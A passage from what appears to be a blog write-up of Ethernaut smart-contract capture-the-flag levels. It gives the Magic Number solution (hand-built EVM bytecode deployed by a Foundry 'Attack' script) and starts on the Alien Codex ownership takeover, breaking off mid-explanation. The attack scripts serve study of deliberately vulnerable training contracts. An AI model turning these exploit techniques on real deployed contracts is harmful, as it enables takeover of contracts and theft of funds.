&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;missedToken&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;RecoverySolve.s.sol:RecoverySolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;18-magic-number&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#18-magic-number&quot; aria-label=&quot;Anchor link for: 18-magic-number&quot;&gt;18 Magic Number&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;MagicNum.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract MagicNum {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  address public solver&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setSolver&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _solver&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    solver &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_solver&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ 
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;  *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. But the solver contract should be very small at most 10 OPCODES.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;To solve this challenge we need to write a contract that return 42. But the contract should be written with at most 10 OPCODES.&lt;&#x2F;li&gt;
&lt;li&gt;We need write our contract in Assembly not in solidity, so that we can build very tiny contract with less OPCODES.&lt;&#x2F;li&gt;
&lt;li&gt;Then we can convert it into bytecode and deploy onto blockchain and then pass the address to the &lt;code&gt;setSolver()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;Bytecodes are divided into two main types in solidity.
&lt;ol&gt;
&lt;li&gt;Runtime bytecode&lt;&#x2F;li&gt;
&lt;li&gt;Creation bytecode&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Runtime bytecode will be stored on blockchain and executes when a call happens&lt;&#x2F;li&gt;
&lt;li&gt;Creation code consist of &lt;strong&gt;init data&lt;&#x2F;strong&gt;, &lt;strong&gt;runtime data&lt;&#x2F;strong&gt; and &lt;strong&gt;constructor bytecode&lt;&#x2F;strong&gt;. We need to create a runtime code which returns 42 upon call and append it with some init data which is required to deploy a contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt; Create a RUNTIME BYTECODE which returns 42 
&lt;&#x2F;span&gt;&lt;span&gt; PUSH1 0x2a --&amp;gt; pushing 42 into stack
&lt;&#x2F;span&gt;&lt;span&gt; PUSH1 0x00
&lt;&#x2F;span&gt;&lt;span&gt; MSTORE --&amp;gt; Stores 0x2a at 0x00 location
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt; PUSH 0x20  --&amp;gt; pushing 32 into stack
&lt;&#x2F;span&gt;&lt;span&gt; PUSH 0x00  
&lt;&#x2F;span&gt;&lt;span&gt; RETURN  --&amp;gt; returns value at 0x00 to 0x20 in memory
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt; ---&amp;gt; Combining this will be runtime code : 602a60005260206000f3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt; &#x2F;&#x2F; Creating Creation code
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt; PUSH10 0x602a60005260206000f3
&lt;&#x2F;span&gt;&lt;span&gt; PUSH 0x00
&lt;&#x2F;span&gt;&lt;span&gt; MSTORE  --&amp;gt; Stores runtime bytecode at 0x00 in memory 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; PUSH 0x0a  --&amp;gt; push 10 into memory : Length of the run time code
&lt;&#x2F;span&gt;&lt;span&gt; PUSH 0x16  --&amp;gt; push 22 into memory : Offset position
&lt;&#x2F;span&gt;&lt;span&gt;   &#x2F;&#x2F; MSTORE stores 0x0000000000000000000000602a60005260206000f3 
&lt;&#x2F;span&gt;&lt;span&gt; RETURN
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt; ---&amp;gt; Creation Code : 69602a60005260206000f3600052600a6016f3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can use this creation code to deploy a contract using &lt;code&gt;create&lt;&#x2F;code&gt; opcode and pass the address of the deployed contract to &lt;code&gt;setSolver()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;MagicNumSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{MagicNum} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;MagicNum.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract MagicNumSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    MagicNum public magicNum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;MagicNum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x396D3C79ecde0C91F14562d41ecf0F7685016b65&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;       bytes memory bytecode &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;69602a60005260206000f3600052600a6016f3&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;       address _solver&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; create(value, offset, size)
&lt;&#x2F;span&gt;&lt;span&gt;       assembly {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;_solver&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;create&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(bytecode&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;       }
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(_solver &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;       magicNum&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setSolver&lt;&#x2F;span&gt;&lt;span&gt;(_solver)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;MagicNumSolve.s.sol:MagicNumSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;19-alien-codex&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#19-alien-codex&quot; aria-label=&quot;Anchor link for: 19-alien-codex&quot;&gt;19 Alien Codex&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;AlienCodex.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;.&#x2F;helpers&#x2F;Ownable-05.sol&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract AlienCodex is Ownable{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  bool public contact&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  bytes32[] public codex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contacted&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;assert&lt;&#x2F;span&gt;&lt;span&gt;(contact)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;makeContact&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    contact &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;record&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 _content&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contacted public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    codex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;push&lt;&#x2F;span&gt;&lt;span&gt;(_content)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;retract&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contacted public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    codex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;--&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revise&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 _content&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contacted public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    codex[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;Ownable-05.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span&gt;contract Ownable {
&lt;&#x2F;span&gt;&lt;span&gt;    address private _owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    Remaining code......
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Claim ownership to complete the level.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;First thing to note is the challenge contract uses pragma &lt;code&gt;0.5.0&lt;&#x2F;code&gt;, so it prone to integer overflow&#x2F;underflows.&lt;&#x2F;li&gt;
&lt;li&gt;To call any function on the contract we need to call the &lt;code&gt;makeContact()&lt;&#x2F;code&gt; function initially.&lt;&#x2F;li&gt;
&lt;li&gt;Observe that &lt;code&gt;codex&lt;&#x2F;code&gt; is a dynamic bytes32 array. Recall how dynamic arrays stored in storage layout.&lt;&#x2F;li&gt;
